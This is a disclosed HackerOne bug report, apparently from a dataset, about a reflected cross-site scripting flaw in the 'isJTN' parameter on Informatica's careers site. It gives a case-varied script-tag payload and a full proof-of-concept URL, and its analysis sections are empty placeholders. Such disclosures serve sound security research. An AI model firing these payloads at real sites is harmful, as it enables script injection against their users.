---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '190020'
original_report_id: '190020'
title: '[careers.informatica.com] XSS on "isJTN"'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2016-12-10T01:07:44.215Z'
disclosed_at: '2017-04-07T16:29:46.216Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [careers.informatica.com] XSS on "isJTN"

## Metadata

- HackerOne Report ID: 190020
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2017-04-07T16:29:46.216Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hi ,
i found XSS bug on parameter  "isJTN=" at careers.informatica.com give you ability to run java script code
tested on firefox 50.0.2 also on old version of google chrome in the last version , but if try this bug in chrome last version you will got a source code displayed on page with out run cuz security protected stop XSS code 

* POC

used payload   : </ScrIpt><SCRIPT>+alert("X");</SCRIPT>

https://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert("X");</SCRIPT>true&isQuickApply=false

are this eligible for swag !?
cheer

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
